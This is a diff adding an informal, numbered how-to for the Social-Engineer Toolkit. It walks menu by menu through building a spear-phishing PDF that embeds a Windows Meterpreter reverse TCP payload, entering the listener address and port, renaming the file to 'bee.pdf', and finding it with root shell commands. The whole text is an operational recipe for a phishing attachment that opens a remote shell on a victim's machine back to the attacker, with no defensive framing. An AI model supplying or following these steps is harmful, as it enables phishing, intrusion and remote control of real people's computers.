@@ -1,0 +1,38 @@
+1: search up "socail engineering toolkit" on some searchbar 
+
+2: then select "1) social-engineering Attacks" from the menu
+
+3: then select "1) spear-phishing Attack Vectors" from the 2nd menu
+
+4: then "2) Create a fileFormat payload" from the next menu
+
+5: then "13) Adobe PDF Embedded EXE Social Engineering" from the next menu
+
+6: then " 2. Use built-in BLANK PDF for attack " from the next menu
+
+7: then " 2) Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim and send back to attacker " from the next menu
+
+8: then on the terminal after "set>" type:
+IP address or URL (ww.ex.com) for the payload listener (LHOST) [192.168.141.130]:
+
+9: then on the terminal after "set:payloads>" type:
+Port to connect back on [443]:
+
+10: enter the example filename (if asked)
+
+11: then select " 2. Rename the file, I want tobe cool."
+
+12: enter the new filename on the terminal after "set:phishing>" :
+New filename:bee.pdf
+
+13: open a new tab
+
+14: type:
+$ sudo su
+$ cd
+$cd .set
+$ ls
+[a bee.pdf file will be created]
+ 
+
+ 
